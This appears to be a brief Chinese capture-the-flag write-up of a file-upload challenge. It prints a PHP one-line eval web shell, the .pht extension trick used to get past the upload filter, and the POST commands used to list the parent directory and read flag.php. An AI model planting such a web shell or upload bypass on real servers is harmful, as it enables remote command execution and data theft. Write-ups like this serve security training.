![image-20250403180132601](./assets/image-20250403180132601.png)



php一句话木马

```
<?php @eval($_POST[ra1n3]);?>
```

上传

![image-20250403180227868](./assets/image-20250403180227868.png)



尝试修改后缀名为php3，php5都不行

pht可以

```
ra1n3=system("ls ../");
```

![image-20250403180838051](./assets/image-20250403180838051.png)

上一级目录中发现flag



```
ra1n3=system("tac ../flag.php");
```

![image-20250403180901490](./assets/image-20250403180901490.png)